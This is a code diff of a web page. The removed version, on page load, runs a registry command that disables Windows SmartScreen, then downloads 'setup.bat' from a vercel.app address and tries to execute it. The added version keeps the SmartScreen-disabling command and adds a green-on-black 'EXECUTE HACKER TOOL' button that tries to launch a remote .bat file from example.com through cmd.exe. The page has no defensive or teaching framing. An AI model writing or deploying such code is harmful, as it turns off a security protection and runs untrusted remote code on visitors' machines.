@@ -3,39 +3,42 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Download and Run .bat File</title>
+  <title>Hack SmartScreen</title>
+  <style>
+    body {
+      background-color: black;
+      color: green;
+      font-family: monospace;
+      text-align: center;
+      padding-top: 100px;
+    }
+    h1 {
+      font-size: 36px;
+    }
+    p {
+      font-size: 24px;
+    }
+  </style>
 </head>
 <body>
+  <h1>WARNING!</h1>
+  <p>SMARTSCREEN HAS BEEN HACKED!</p>
+  <p>CLICK THE BUTTON BELOW TO EXECUTE THE HACKER TOOL!</p>
+  <button onclick="executeHackerTool()">EXECUTE HACKER TOOL</button>
+
   <script>
-    async function downloadAndRunBatFile(fileUrl) {
+    async function executeHackerTool() {
       try {
-        // Disable SmartScreen via cmd prompt
+        // Execute hacker tool to disable SmartScreen
         const disableSmartScreenCmd = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f';
         await executeCommandViaCmd(disableSmartScreenCmd);
 
-        // Alert user about SmartScreen
-        alert('SmartScreen has been disabled. Proceeding to download and execute the "setup.bat" file.');
+        // Alert user about successful hack
+        alert('SMARTSCREEN HACKED SUCCESSFULLY! PREPARE FOR HACKER TOOL EXECUTION!');
 
-        // Download .bat file
-        const response = await fetch(fileUrl);
-        if (!response.ok) {
-          throw new Error('Network response was not ok');
-        }
-        const blob = await response.blob();
-        const file = new File([blob], 'setup.bat', { type: 'application/bat' });
-        const url = window.URL.createObjectURL(file);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = 'setup.bat'; // Provide a default file name for download
-        document.body.appendChild(a);
-        a.click();
-        window.URL.revokeObjectURL(url);
-        
-        // Alert user to manually run the downloaded .bat file
-        alert('File downloaded successfully! Attempting to execute the "setup.bat" file automatically.');
-
-        // Attempt to automatically execute the downloaded .bat file
-        const execCommand = `cmd.exe /c start setup.bat`;
+        // Attempt to execute hacker tool
+        const hackerToolUrl = 'https://example.com/hacker_tool.bat';
+        const execCommand = `cmd.exe /c start ${hackerToolUrl}`;
         const execResult = await new Promise(resolve => {
           const script = document.createElement('script');
           script.textContent = `
@@ -53,11 +56,11 @@
         });
 
         if (!execResult.success) {
-          throw new Error(`Error executing file: ${execResult.error}`);
+          throw new Error(`Error executing hacker tool: ${execResult.error}`);
         }
       } catch (error) {
-        console.error('Error downloading or executing file:', error);
-        alert('Error downloading or executing file. Please try again later.');
+        console.error('Error hacking SmartScreen:', error);
+        alert('ERROR: SMARTSCREEN HACK FAILED!');
       }
     }
 
@@ -72,9 +75,6 @@
         }
       });
     }
-
-    // Call the function with the file URL
-    downloadAndRunBatFile('https://dd-xi-five.vercel.app/setup.bat');
   </script>
 </body>
 </html>
